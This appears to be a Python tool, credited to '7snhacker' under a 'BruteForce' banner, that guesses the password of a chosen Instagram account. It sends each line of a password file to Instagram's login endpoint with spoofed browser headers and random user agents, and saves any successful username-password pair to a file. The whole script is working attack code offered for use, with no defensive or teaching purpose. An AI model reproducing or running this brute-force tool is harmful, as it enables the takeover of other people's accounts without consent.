def log():
    import requests
    import tkinter
    import time
    from user_agent import generate_user_agent
    from tkinter import messagebox
    root = tkinter.Tk()
    root.withdraw()
    print("""
   .-. .-')  _  .-')              .-') _     ('-.                          _  .-')               ('-.   
\  ( OO )( \( -O )            (  OO) )  _(  OO)                        ( \( -O )            _(  OO)  
 ;-----.\ ,------. ,--. ,--.  /     '._(,------.   ,------. .-'),-----. ,------.   .-----. (,------. 
 | .-.  | |   /`. '|  | |  |  |'--...__)|  .---'('-| _.---'( OO'  .-.  '|   /`. ' '  .--./  |  .---' 
 | '-' /_)|  /  | ||  | | .-')'--.  .--'|  |    (OO|(_\    /   |  | |  ||  /  | | |  |('-.  |  |     
 | .-. `. |  |_.' ||  |_|( OO )  |  |  (|  '--. /  |  '--. \_) |  |\|  ||  |_.' |/_) |OO  )(|  '--.  
 | |  \  ||  .  '.'|  | | `-' /  |  |   |  .--' \_)|  .--'   \ |  | |  ||  .  '.'||  |`-'|  |  .--'  
 | '--'  /|  |\  \('  '-'(_.-'   |  |   |  `---.  \|  |_)     `'  '-'  '|  |\  \(_'  '--'\  |  `---. 
 `------' `--' '--' `-----'      `--'   `------'   `--'         `-----' `--' '--'  `-----'  `------'           
                                
""")

    print("                    by 7snhacker")
    print("")
    passw = open("password.txt","r")
    user = input("username : ")
    sleep = input("sleep : ")
    sleep = float(sleep)
    while True:
        password = passw.readline().split('\n')[0]
        time.sleep(sleep)
        headers = {
            'authority': 'www.instagram.com',
            'x-ig-www-claim': 'hmac.AR08hbh0m_VdJjwWvyLFMaNo77YXgvW_0JtSSKgaLgDdUu9h',
            'x-instagram-ajax': '82a581bb9399',
            'content-type': 'application/x-www-form-urlencoded',
            'accept': '*/*',
            'user-agent': f'{generate_user_agent()}',
            'x-requested-with': 'XMLHttpRequest',
            'x-csrftoken': 'rn3aR7phKDodUHWdDfCGlERA7Gmhes8X',
            'x-ig-app-id': '936619743392459',
            'origin': 'https://www.instagram.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://www.instagram.com/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cookie': ''


        }
        data = {
            'username': user,
            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:&:{password}'
        }
        url = "https://www.instagram.com/accounts/login/ajax/"
        r = requests.post(url,headers=headers,data=data).text
        if ('"authenticated":true') in r:
            print(f'Cracked [$] {user}:{password}')
            open("cracked.txt","w").writelines(f'{user}:{password}')
            
        elif ('"authenticated":false') in r:
             print(f'Trying [!] {user}:{password}')
             
        else:
            print(f'ERROR [!] {user}:{password}')
            


log()

